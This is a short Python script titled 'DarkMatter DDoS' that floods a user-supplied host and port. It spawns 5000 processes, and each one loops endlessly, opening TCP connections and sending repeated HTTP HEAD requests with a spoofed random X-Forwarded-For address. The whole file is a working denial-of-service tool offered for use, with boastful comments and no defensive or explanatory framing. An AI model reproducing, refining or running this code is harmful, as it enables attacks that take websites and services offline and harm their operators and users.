import socket
import os, sys
import time
import multiprocessing, random


print("Welcome To DarkMatter DDoS")
ip = input("IP/Domain: ")
port = int(input("Port: "))

url = "http://" + str(ip)


def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip


print("[>>>] Starting the attack [<<<]")
time.sleep(1)


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      #Attack starts here
      for y in range(100):
          atk.send(str.encode(request))
    except socket.error:
      time.sleep(.1)
    except:
      pass


def send2attack():
  for i in range(5000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

    
send2attack() #61 lines for the most powerful attack, cool?
